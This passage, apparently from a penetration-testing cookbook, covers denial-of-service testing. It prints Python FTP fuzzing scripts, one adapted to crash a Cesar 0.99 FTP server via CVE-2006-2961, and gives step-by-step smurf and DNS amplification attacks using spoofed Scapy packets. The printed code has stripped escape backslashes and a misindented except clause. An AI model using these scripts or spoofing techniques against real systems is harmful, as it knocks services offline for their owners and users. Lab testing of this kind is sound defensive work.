<html><head></head><body>
        <section id="8FPGA1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Denial of Service</h1>
            

            <article>
                
<p class="calibre5">Any time you make resources publicly accessible over the Internet or even to a small community over an internal network, it is important to consider the risk of <strong class="calibre1">denial-of-service</strong> (<strong class="calibre1">DoS</strong>) attacks. DoS attacks can be frustrating and can be very costly at times. Worst of all, these threats can often be some of the most difficult ones to mitigate. To be able to properly assess the threat to your network and information resources, you must understand the types of DoS threats that exist and the trends associated with them. This chapter will include the following recipes to evaluate DoS threats:</p>
<ul class="calibre18">
<li class="calibre19">Fuzz testing to identify buffer overflows</li>
<li class="calibre19">Remote FTP service buffer overflow DoS</li>
<li class="calibre19">Smurf DoS attack</li>
<li class="calibre19">DNS amplification DoS attack</li>
<li class="calibre19">SNMP amplification DoS attack</li>
<li class="calibre19">SYN flood DoS attack</li>
<li class="calibre19">Sock stress DoS attack</li>
<li class="calibre19">DoS attacks with Nmap NSE</li>
<li class="calibre19">DoS attacks with Metasploit</li>
<li class="calibre19">DoS attacks with the exploit database</li>
</ul>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8GO0S1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Introduction</h1>
            

            <article>
                
<p class="calibre5">Prior to addressing each of these listed recipes individually, we should address some of the underlying principles and understand how they relate to the DoS attacks that will be discussed in this chapter. The DoS attacks that we will discuss in the recipes that follow could all be categorized as buffer overflows, traffic-amplification attacks, or resource-consumption attacks. We will address the general principles associated with how each of these types of attacks works in this order.</p>
<p class="calibre5">Buffer overflows are a type of coding vulnerability that can result in the denial of service of an application, service, or the entire underlying operating system. Generally speaking, buffer overflows are capable of causing a denial of service because they can result in arbitrary data being loaded into unintended segments of memory. This can disrupt the flow of execution and result in a crash of the service or operating system.</p>
<p class="calibre5">Traffic-amplification DoS attacks are able to generate a DoS condition by consuming the network bandwidth that is available to a particular server, device, or network. Two conditions are required for a traffic-amplification attack to be successful. These conditions are as follows:</p>
<ul class="calibre18">
<li class="calibre19"><strong class="calibre1">Redirection</strong>: An attacker must be able to solicit a response that can be redirected to a victim. This is generally accomplished by IP spoofing. As UDP is not a connection-oriented protocol, most application-layer protocols that use UDP as their associated transport layer protocol can be used to redirect service responses to other hosts via spoofed requests.</li>
<li class="calibre19"><strong class="calibre1">Amplification</strong>: The redirected response must be larger than the request that solicited that response. The larger the response byte size to request byte size ratio, the more successful the attack will be.</li>
</ul>
<p class="calibre5">For example, if a UDP service that generates a response that is 10 times larger than the associated request is discovered, an attacker could leverage this service to potentially generate 10 times the amount of attack traffic than it could otherwise generate by sending spoofed requests to the vulnerable service at the highest rate of transmission possible.</p>
<p class="calibre5">Resource-consumption attacks are attacks that generate a condition in which the local resources of the hosting server or device are consumed to such an extent that these resources are no longer available to perform their intended operational function. This type of attack can target various local resources, including memory, processor power, disk space, or sustainability of concurrent network connections.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8HMHE1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Fuzz testing to identify buffer overflows</h1>
            

            <article>
                
<p class="calibre5">One of the most effective techniques to identify buffer-overflow vulnerabilities is fuzz testing. <strong class="calibre1">Fuzzing</strong> is the practice of testing the results associated with various input by passing crafted or random data to a function. In the right circumstances, it is possible that input data can escape its designated buffer and flow into adjacent registers or segments of memory. This process will disrupt the execution flow and result in application or system crashes. In certain circumstances, buffer-overflow vulnerabilities can also be leveraged to execute unauthorized code. In this particular recipe, we will discuss how to test for buffer-overflow vulnerabilities by developing custom fuzzing tools.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8IL201-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To perform remote fuzz testing, you will need to have a system that is running network services over TCP or UDP. In the example provided, a Windows XP system with an FTP service is used for this task. For more information on setting up a Windows system, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>. Additionally, this section will require a script to be written to the filesystem, using a text editor such as Vim or <span>GNU n</span>ano. For more information on writing scripts, refer to the <em class="calibre15">Using text editors (Vim and <span>GNU n</span>ano)</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8JJII1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">Python is an excellent scripting language that can be used to effectively develop custom fuzzing utilities. When assessing TCP services, the <kbd class="calibre16">socket</kbd> function can be useful in simplifying the process of performing the full three-way handshake sequence and connecting to a listening service port. The main objective of any fuzzing script is to send data to any given function as input and evaluate the result:</p>
<ol class="calibre20">
<li value="1" class="calibre19">I have developed a script that can be used to fuzz the post-authentication functions of an FTP service:</li>
</ol>
<pre class="calibre24">
        #!/usr/bin/python<br class="title-page-name"/><br class="title-page-name"/>        import socket<br class="title-page-name"/>        import sys<br class="title-page-name"/><br class="title-page-name"/>        if len(sys.argv) != 6:<br class="title-page-name"/>            print "Usage - ./ftp_fuzz.py [Target-IP] [Port Number]<br class="title-page-name"/>             [Payload] [Interval] [Maximum]"<br class="title-page-name"/>            print "Example - ./ftp_fuzz.py 10.0.0.5 21 A 100 1000"<br class="title-page-name"/>            print "Example will fuzz the defined FTP service<br class="title-page-name"/>             with a series of payloads"<br class="title-page-name"/>            print "to include 100 'A's, 200 'A's, etc...<br class="title-page-name"/>             up to the maximum of 1000"<br class="title-page-name"/>            sys.exit()<br class="title-page-name"/><br class="title-page-name"/>        target = str(sys.argv[1])<br class="title-page-name"/>        port = int(sys.argv[2])<br class="title-page-name"/>        char = str(sys.argv[3])<br class="title-page-name"/>        i = int(sys.argv[4])<br class="title-page-name"/>        interval = int(sys.argv[4])<br class="title-page-name"/>        max = int(sys.argv[5])<br class="title-page-name"/>        user = raw_input(str("Enter ftp username: "))<br class="title-page-name"/>        passwd = raw_input(str("Enter ftp password: "))<br class="title-page-name"/>        command = raw_input(str("Enter FTP command to fuzz: "))<br class="title-page-name"/><br class="title-page-name"/>        while i &lt;= max:<br class="title-page-name"/>            try:<br class="title-page-name"/>                payload = command + " " + (char * i)<br class="title-page-name"/>                print "Sending " + str(i) + " instances of payload<br class="title-page-name"/>                 (" + char + ") to target"<br class="title-page-name"/>                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br class="title-page-name"/>                connect=s.connect((target,port))<br class="title-page-name"/>                s.recv(1024)<br class="title-page-name"/>                s.send('USER ' + user + 'rn')<br class="title-page-name"/>                s.recv(1024)<br class="title-page-name"/>                s.send('PASS ' + passwd + 'rn')<br class="title-page-name"/>                s.recv(1024)<br class="title-page-name"/>                s.send(payload + 'rn')<br class="title-page-name"/>                s.send('QUITrn')<br class="title-page-name"/>                s.recv(1024)<br class="title-page-name"/>                s.close()<br class="title-page-name"/>                i = i + interval<br class="title-page-name"/>            except:<br class="title-page-name"/>                print "nUnable to send...Server may have crashed"<br class="title-page-name"/>                sys.exit()<br class="title-page-name"/><br class="title-page-name"/>        print "nThere is no indication that the server has crashed"
</pre>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">The first part of the script defines the location of the Python interpreter and imports the required libraries.</li>
<li value="3" class="calibre19">The second part evaluates the number of arguments supplied to ensure that it is consistent with the appropriate usage of the script.</li>
<li value="4" class="calibre19">The third part of the script defines the variables that will be used throughout the script execution. Several of these variables receive their values from system arguments that are passed to the script upon execution.</li>
</ol>
<ol start="5" class="calibre20">
<li value="5" class="calibre19">The remaining variables are defined by accepting input from the user of the script.</li>
<li value="6" class="calibre19">Finally, the remainder of the script defines the fuzzing process. We execute the <kbd class="calibre16">ftp_fuzz.py</kbd> file, as follows:</li>
</ol>
<div class="p"><img class="alignnone30" src="../images/00190.jpeg"/></div>
<ol start="7" class="calibre20">
<li value="7" class="calibre19">If the script is executed without the appropriate number of system arguments, the script will return the expected usage. There are several values that must be included as system arguments:
<ul class="calibre30">
<li class="calibre19">The first argument to be passed to the script is the <kbd class="calibre16">Target IP</kbd> address. This IP address is the one associated with the system that is running the FTP service that you wish to fuzz.</li>
<li class="calibre19">The next argument is the <kbd class="calibre16">Port Number</kbd> on which the FTP service is running. In most cases, FTP will run on the TCP port <kbd class="calibre16">21</kbd>. The <kbd class="calibre16">Payload</kbd> argument will define the character or sequence of characters to be passed in bulk to the service.</li>
<li class="calibre19">The <kbd class="calibre16">Interval</kbd> argument defines the number of instances of the defined payload that will be passed to the FTP service on the first iteration. The argument will also be the number by which the number of payload instances will be incremented with on each successive iteration up to the <kbd class="calibre16">Maximum</kbd> value. This <kbd class="calibre16">Maximum</kbd> value is defined by the value of the last argument.</li>
</ul>
</li>
<li value="8" class="calibre19">After the script is executed with these system arguments, it will request authentication credentials for the FTP service and will ask which post-authentication function should be fuzzed.</li>
<li value="9" class="calibre19">In the example provided, the fuzzing was performed against the FTP service that runs on the TCP port <kbd class="calibre16">21</kbd> of the Windows XP host at the IP address <kbd class="calibre16">172.16.69.129</kbd>. Anonymous login credentials were passed to the FTP service with an arbitrary e-mail address. Also, a series of <kbd class="calibre16">A</kbd> was passed to the <kbd class="calibre16">MKD</kbd> post-authentication function, starting with <kbd class="calibre16">100</kbd> instances and incrementing by 100 until the maximum of <kbd class="calibre16">1000</kbd> instances was reached.</li>
<li value="10" class="calibre19">The same script could also be used to pass a series of characters in the payload:</li>
</ol>
<div class="p"><img class="alignnone182" src="../images/00666.jpeg"/></div>
<ol start="11" class="calibre20">
<li value="11" class="calibre19">In the example provided, the payload was defined as <kbd class="calibre16">ABCD</kbd>, and instances of this payload were defined as multiples of 100 up to the value of <kbd class="calibre16">500</kbd>.</li>
</ol>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8KI341-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">Generally speaking, buffer overflows are capable of causing a denial of service, because they can result in arbitrary data being loaded into unintended segments of memory. This can disrupt the flow of execution and result in a crash of the service or operating system. The particular script discussed in this recipe works because in the event that the service or operating system did crash, the socket would no longer accept input, and the script would not be able to complete the entire payload series injection sequence. If this occurred, the script would need to be force-closed using <em class="calibre15">Ctrl</em> + <em class="calibre15">C</em>. In such a case, the script would return an indication that subsequent payloads could not be sent and that the server may have crashed.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8LGJM1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Remote FTP service buffer-overflow DoS</h1>
            

            <article>
                
<p class="calibre5">In the right circumstances, it is possible that input data can escape its designated buffer and flow into adjacent registers or segments of memory. This process will disrupt the execution flow and result in application or system crashes. In certain circumstances, buffer-overflow vulnerabilities can also be leveraged to execute unauthorized code. In this particular recipe, we will demonstrate an example of how to perform a DoS attack based on buffer overflow against a Cesar 0.99 FTP service.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8MF481-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To perform remote fuzz testing, you will need to have a system that is running network services over TCP or UDP. In the example provided, a Windows XP system with an FTP service is used for this task. For more information on setting up a Windows system, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>. Additionally, this section will require a script to be written to the filesystem, using a text editor such as Vim or <span>GNU n</span>ano. For more information on writing scripts, refer to the <em class="calibre15">Using text editors (Vim and <span>GNU n</span>ano)</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8NDKQ1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">There is a publicly disclosed vulnerability associated with the Cesar 0.99 FTP service. This vulnerability is defined by the <strong class="calibre1">Common Vulnerabilities and Exposures</strong> (<strong class="calibre1">CVE</strong>) numbering system as <kbd class="calibre16">CVE-2006-2961</kbd>. By performing research on this vulnerability, it becomes apparent that a stack-based buffer overflow can be triggered by sending a post-authentication sequence of line-break characters to the <kbd class="calibre16">MKD</kbd> function:</p>
<ol class="calibre20">
<li value="1" class="calibre19">To avoid the difficulty associated in passing the <kbd class="calibre16">n</kbd> escape sequence to the Python script and then having it properly interpreted in the supplied input, we should modify the script that was discussed in the previous recipe. We can then use the modified script to exploit this existing vulnerability, as follows:</li>
</ol>
<pre class="calibre24">
        #!/usr/bin/python<br class="title-page-name"/><br class="title-page-name"/>        import socket<br class="title-page-name"/>        import sys<br class="title-page-name"/><br class="title-page-name"/>        if len(sys.argv) != 5:<br class="title-page-name"/>            print "Usage - ./ftp_fuzz.py [Target-IP]<br class="title-page-name"/>             [Port Number] [Interval] [Maximum]"<br class="title-page-name"/>            print "Example - ./ftp_fuzz.py 10.0.0.5 21 100 1000"<br class="title-page-name"/>            print "Example will fuzz the defined FTP service<br class="title-page-name"/>             with a series of line break "<br class="title-page-name"/>            print "characters to include 100 'n's, 200 'n's,<br class="title-page-name"/>             etc... up to the maximum of 1000"<br class="title-page-name"/>            sys.exit()<br class="title-page-name"/><br class="title-page-name"/>        target = str(sys.argv[1])<br class="title-page-name"/>        port = int(sys.argv[2])<br class="title-page-name"/>        i = int(sys.argv[3])<br class="title-page-name"/>        interval = int(sys.argv[3])<br class="title-page-name"/>        max = int(sys.argv[4])<br class="title-page-name"/>        user = raw_input(str("Enter ftp username: "))<br class="title-page-name"/>        passwd = raw_input(str("Enter ftp password: "))<br class="title-page-name"/>        command = raw_input(str("Enter FTP command to fuzz: "))<br class="title-page-name"/><br class="title-page-name"/>        while i &lt;= max:<br class="title-page-name"/>            try:<br class="title-page-name"/>                payload = command + " " + ('n' * i)<br class="title-page-name"/>                print "Sending " + str(i) + " line break<br class="title-page-name"/>                 characters to target"<br class="title-page-name"/>                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br class="title-page-name"/>                connect=s.connect((target,port))<br class="title-page-name"/>                s.recv(1024)<br class="title-page-name"/>                s.send('USER ' + user + 'rn')<br class="title-page-name"/>                s.recv(1024)<br class="title-page-name"/>                s.send('PASS ' + passwd + 'rn')<br class="title-page-name"/>                s.recv(1024)<br class="title-page-name"/>                s.send(payload + 'rn')<br class="title-page-name"/>                s.send('QUITrn')<br class="title-page-name"/>                s.recv(1024)<br class="title-page-name"/>                s.close()<br class="title-page-name"/>                i = i + interval<br class="title-page-name"/>        except:<br class="title-page-name"/>            print "nUnable to send...Server may have crashed"<br class="title-page-name"/>            sys.exit()<br class="title-page-name"/><br class="title-page-name"/>        print "nThere is no indication that the server has crashed"
</pre>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">Modifications made to the script include modifying the usage description and removing the payload as a supplied argument and then hardcoding a line-break payload into the script to be sent in sequence:</li>
</ol>
<div class="p"><img class="alignnone183" src="../images/00051.jpeg"/></div>
<ol start="3" class="calibre20">
<li value="3" class="calibre19">If the script is executed without the appropriate number of system arguments, the script will return the expected usage. We can then execute the script and send a series of payloads as multiples of <kbd class="calibre16">100</kbd> and up to the maximum of <kbd class="calibre16">1000</kbd>.</li>
</ol>
<ol start="4" class="calibre20">
<li value="4" class="calibre19">After sending the payload of <kbd class="calibre16">700</kbd> line-break characters, the script stops sending payloads and sits idle. After a period of inactivity, the script is forced to close with <em class="calibre15">Ctrl</em> + <em class="calibre15">C</em>. The script indicates that it has been unable to send characters and that the remote server might have crashed. Have a look at the following screenshot:</li>
</ol>
<div class="p"><img class="alignnone184" src="../images/00118.jpeg"/></div>
<ol start="5" class="calibre20">
<li value="5" class="calibre19">By returning to the Windows XP machine that is running the Cesar 0.99 FTP service, we can see that the <kbd class="calibre16">server.exe</kbd> application has crashed. To resume operations after the denial of service, the Cesar FTP service has to be manually restarted.</li>
</ol>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8OC5C1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">Generally speaking, buffer overflows are capable of causing a denial of service because they can result in arbitrary data being loaded into unintended segments of memory. This can disrupt the flow of execution and result in a crash of the service or operating system.The particular script discussed in this recipe works because in the event that the service or operating system did crash, the socket would no longer accept input, and the script would not be able to complete the entire payload series injection sequence. If this occurred, the script would need to be force-closed using <em class="calibre15">Ctrl + C</em>. In such a case, the script would return an indication that subsequent payloads could not be sent and that the server might have crashed.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8PALU1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Smurf DoS attack</h1>
            

            <article>
                
<p class="calibre5">A <strong class="calibre1">smurf</strong> attack is historically one of the oldest techniques to perform a <strong class="calibre1">distributed denial-of-service</strong> (<strong class="calibre1">DDoS</strong>) amplification attack. This attack consists of sending a series of ICMP echo requests with a spoofed source IP address to the network broadcast address. When this echo request is broadcast, all hosts on the LAN should simultaneously reply to the target for each spoofed request received. This technique is less effective against modern systems, as most will not reply to IP-directed broadcast traffic.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8Q96G1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To perform a smurf attack, you will need to have the LAN with multiple systems running on it. In the examples provided, an installation of Ubuntu is used as a scan target. For more information on setting up Ubuntu, refer to the <em class="calibre15">Installing Ubuntu Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8R7N21-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">To attempt to perform a traditional smurf attack, Scapy can be used to build the necessary packets from scratch:</p>
<ol class="calibre20">
<li value="1" class="calibre19">To use Scapy from the Kali Linux command line, use the <kbd class="calibre16">scapy</kbd> command from a Terminal; this is shown in the following screenshots. To send an ICMP request to the broadcast address, we must first build the layers of this request. The first layer that we will need to construct is the IP layer:</li>
</ol>
<div class="p"><img class="alignnone185" src="../images/00191.jpeg"/></div>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">To build the IP layer of our request, we should assign the <kbd class="calibre16">IP</kbd> object to the variable <kbd class="calibre16">i</kbd>. By calling the <kbd class="calibre16">display()</kbd> function, we can identify the attribute configurations for the object. By default, both the sending and receiving addresses are set to the loopback address of <kbd class="calibre16">127.0.0.1</kbd>. These values can be modified by changing the destination address by setting <kbd class="calibre16">i.dst</kbd> equal to the string value of the broadcast address. By calling the <kbd class="calibre16">display()</kbd> function again, we can see that not only has the destination address been updated, but Scapy will also automatically update the source IP address to the address associated with the default interface.</li>
</ol>
<ol start="3" class="calibre20">
<li value="3" class="calibre19">Now that we have constructed the IP layer of the request, we should proceed to the ICMP layer:</li>
</ol>
<div class="p"><img class="alignnone186" src="../images/00264.jpeg"/></div>
<ol start="4" class="calibre20">
<li value="4" class="calibre19">To build the ICMP layer of our request, we will use the same technique as we did for the IP layer. By default, the ICMP layer is already configured to perform an echo request.</li>
<li value="5" class="calibre19">Now that we have created both the IP and ICMP layers, we need to construct the request by stacking these layers:</li>
</ol>
<div class="p"><img class="alignnone187" src="../images/00341.jpeg"/></div>
<ol start="6" class="calibre20">
<li value="6" class="calibre19">The IP and ICMP layers can be stacked by separating the variables with a forward slash. These layers can then be set equal to a new variable that will represent the entire request. The <kbd class="calibre16">display()</kbd> function can then be called to view the configurations for the request. Once the request has been built, it can then be passed to the function. A packet-capture utility such as Wireshark or TCPdump can be used to monitor the result. In the example provided, Wireshark reveals that two of the IP addresses on the LAN responded to the broadcast echo request:</li>
</ol>
<div class="p"><img class="alignnone188" src="../images/00433.jpeg"/></div>
<ol start="7" class="calibre20">
<li value="7" class="calibre19">In reality, two responsive addresses are not sufficient to perform an effective DoS attack. If this exercise is replicated in another lab with semimodern hosts, it is likely that the results will be similar. In the case that there were enough responsive addresses to trigger a denial of service, the source address would need to be substituted for the IP address of the attack target:</li>
</ol>
<div class="p"><img class="alignnone189" src="../images/00507.jpeg"/></div>
<ol start="8" class="calibre20">
<li value="8" class="calibre19">In the example provided, a one-line command in Scapy is used to perform the same action as we had discussed earlier, except this time with the source IP address spoofed to the address of another system on the LAN. Additionally, the count value can be used to send multiple requests in sequence.</li>
</ol>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8S67K1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">Amplification attacks work by overwhelming a target with network traffic by leveraging one or more third-party devices. For most amplification attacks, two conditions are true, which are as follows:</p>
<ul class="calibre18">
<li class="calibre19">The protocol used to perform the attack does not verify the requesting source. <span>The response from the network function used should be significantly larger than the request used to solicit it.</span></li>
<li class="calibre19">The effectiveness of a traditional smurf attack is contingent upon the hosts on the LAN responding to IP-directed broadcast traffic. Such hosts will receive the broadcast ICMP echo request from the spoofed IP address of the target system and then return simultaneous ICMP echo replies for each request received.</li>
</ul>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8T4O61-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">DNS amplification DoS attacks</h1>
            

            <article>
                
<p class="calibre5">A <strong class="calibre1">domain-name dystem</strong> (<strong class="calibre1">DNS</strong>) amplification attack exploits open DNS resolvers by performing a spoofed query of all record types for a given domain. The effectiveness of this attack can be increased by employing a DDoS component as well by sending requests to multiple open resolvers simultaneously.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="8U38O1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To simulate a DNS amplification attack, you will need to either have a local nameserver or know the IP address of an open and publicly accessible nameserver. In the examples provided, an installation of Ubuntu is used as a scan target. For more information on setting up Ubuntu, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section>

            <header id="8V1PA2-cf89710d791c4a3bb78ec273d9322426">
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">To perform a DNS amplification attack, follow the given steps:</p>
<ol class="calibre20">
<li value="1" class="calibre19">In order to understand how DNS amplification works, one can use a basic DNS query utility such as <kbd class="calibre16">host</kbd>, <kbd class="calibre16">dig</kbd>, or <kbd class="calibre16">nslookup</kbd>:</li>
<li value="2" class="calibre19">By performing a request for all record types associated with a well-established domain, you will notice that some return a fairly sizable response:</li>
</ol>
<div class="p"><img class="alignnone190" src="../images/00573.jpeg"/></div>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">In the example provided, a request for all record types associated with the <kbd class="calibre16">yahoo.com</kbd> domain returns a response that includes seven <kbd class="calibre16">A</kbd> records, three <kbd class="calibre16">AAAA</kbd> records, five <kbd class="calibre16">NS</kbd> records, and three <kbd class="calibre16">MX</kbd> records. A DNS amplification attack's effectiveness is directly correlated to the size of the response. We will now attempt to perform the same action using packets built in Scapy.</li>
<li value="3" class="calibre19">To send our DNS query request, we must first build the layers of this request. The first layer that we will need to construct is the IP layer:</li>
</ol>
<div class="p"><img class="alignnone191" src="../images/00633.jpeg"/></div>
<ol start="4" class="calibre20">
<li value="4" class="calibre19">To build the IP layer of our request, we should assign the <kbd class="calibre16">IP</kbd> object to the variable <kbd class="calibre16">i</kbd>. By calling the <kbd class="calibre16">display()</kbd> function, we can identify the attribute configurations for the object. By default, both the sending and receiving addresses are set to the loopback address of <kbd class="calibre16">127.0.0.1</kbd>. These values can be modified by changing the destination address by setting <kbd class="calibre16">i.dst</kbd> equal to the string value of the address of the nameserver to be queried.</li>
<li value="5" class="calibre19">By calling the <kbd class="calibre16">display()</kbd> function again, we can see that not only has the destination address been updated, but Scapy will also automatically update the source IP address to the address associated with the default interface.</li>
<li value="6" class="calibre19">Now that we have constructed the IP layer of the request, we should proceed to the next layer. As DNS is handled over UDP, the next layer to construct is the UDP layer:</li>
</ol>
<div class="p"><img class="alignnone192" src="../images/00001.jpeg"/></div>
<ol start="7" class="calibre20">
<li value="7" class="calibre19">To build the UDP layer of our request, we will use the same technique as we did for the IP layer. In the example provided, the <kbd class="calibre16">UDP</kbd> object was assigned to the <kbd class="calibre16">u</kbd> variable. As discussed earlier, the default configurations can be identified by calling the <kbd class="calibre16">display()</kbd> function.</li>
<li value="8" class="calibre19">Here, we can see that the default values for both the source and destination ports are listed as <kbd class="calibre16">domain</kbd>. As you might likely suspect, this is to indicate the DNS service associated with the port <kbd class="calibre16">53</kbd>. DNS is a common service that can often be discovered on networked systems. To confirm this, one can call the value directly by referencing the variable name and attribute.</li>
<li value="9" class="calibre19">Now that the IP and UDP layers have been constructed, we need to build the DNS layer:</li>
</ol>
<div class="p"><img class="alignnone193" src="../images/00068.jpeg"/></div>
<ol start="10" class="calibre20">
<li value="10" class="calibre19">To build the DNS layer of our request, we will use the same technique as we did for both the IP and UDP layers. In the example provided, the <kbd class="calibre16">DNS</kbd> object was assigned to the <kbd class="calibre16">d</kbd> variable. As discussed earlier, the default configurations can be identified by calling the <kbd class="calibre16">display()</kbd> function. Here, we can see that there are several values that need to be modified:</li>
</ol>
<div class="p"><img class="alignnone194" src="../images/00656.jpeg"/></div>
<ol start="11" class="calibre20">
<li value="11" class="calibre19">The <em class="calibre15">recursion-desired</em> bit needs to be activated; this can be done by setting the <kbd class="calibre16">rd</kbd> value equal to <kbd class="calibre16">1</kbd>. Also, a value of <kbd class="calibre16">0x0001</kbd> needs to be supplied for <kbd class="calibre16">qdcount</kbd>; this can be done by supplying an integer value of <kbd class="calibre16">1</kbd>. By calling the <kbd class="calibre16">display()</kbd> function again, we can verify that the configuration adjustments have been made.</li>
<li value="12" class="calibre19">Now that the IP, UDP, and DNS layers have been constructed, we need to build a DNS question record to assign to the <kbd class="calibre16">qd</kbd> value:</li>
</ol>
<div class="p"><img class="alignnone195" src="../images/00211.jpeg"/></div>
<ol start="13" class="calibre20">
<li value="13" class="calibre19">To build the DNS question record, we will use the same technique as we did for the IP, UDP, and DNS layers. In the example provided, the DNS question record was assigned to the <kbd class="calibre16">q</kbd> variable. As discussed earlier, the default configurations can be identified by calling the <kbd class="calibre16">display()</kbd> function. Here, we can see that there are several values that need to be modified:</li>
</ol>
<div class="p"><img class="alignnone196" src="../images/00087.jpeg"/></div>
<ol start="14" class="calibre20">
<li value="14" class="calibre19">The <kbd class="calibre16">qname</kbd> value needs to be set to the domain that is being queried. Also, <kbd class="calibre16">qtype</kbd> needs to be set to <kbd class="calibre16">ALL</kbd> by passing an integer value of <kbd class="calibre16">255.</kbd> By calling the <kbd class="calibre16">display()</kbd> function again, we can verify that the configuration adjustments have been made.</li>
<li value="15" class="calibre19">Now that the question record has been configured, the question record object should be assigned as the DNS <kbd class="calibre16">qd</kbd> value:</li>
</ol>
<div class="p"><img class="alignnone197" src="../images/00346.jpeg"/></div>
<ol start="16" class="calibre20">
<li value="16" class="calibre19">We can verify that the question record has been assigned to the DNS <kbd class="calibre16">qd</kbd> value by calling the <kbd class="calibre16">display()</kbd> function. Now that the IP, UDP, and DNS layers have been constructed and the appropriate question record has been assigned to the DNS layer, we can construct the request by stacking these layers:</li>
</ol>
<div class="p"><img class="alignnone198" src="../images/00007.jpeg"/></div>
<ol start="17" class="calibre20">
<li value="17" class="calibre19">The IP, UDP, and DNS layers can be stacked by separating the variables with a forward slash. These layers can then be set equal to a new variable that will represent the entire request. The <kbd class="calibre16">display()</kbd> function can then be called to view the configurations for the request.</li>
</ol>
<ol start="18" class="calibre20">
<li value="18" class="calibre19">Prior to sending this request, we should view it in the same display format as we will view the response. By doing this, we can get a better visual understanding of the amplification that occurs between the request and response. This can be done by calling the variable directly:</li>
</ol>
<div class="p"><img class="alignnone199" src="../images/00366.jpeg"/></div>
<ol start="19" class="calibre20">
<li value="19" class="calibre19">Once the request has been built, it can be passed to the send (<kbd class="calibre16">send()</kbd>) and receive (<kbd class="calibre16">recv()</kbd>) functions so that we can analyze the response. We will not assign this to a variable, but instead, we will call the function directly so that the response can be viewed in the same format:</li>
</ol>
<div class="p"><img class="alignnone200" src="../images/00590.jpeg"/></div>
<ol start="20" class="calibre20">
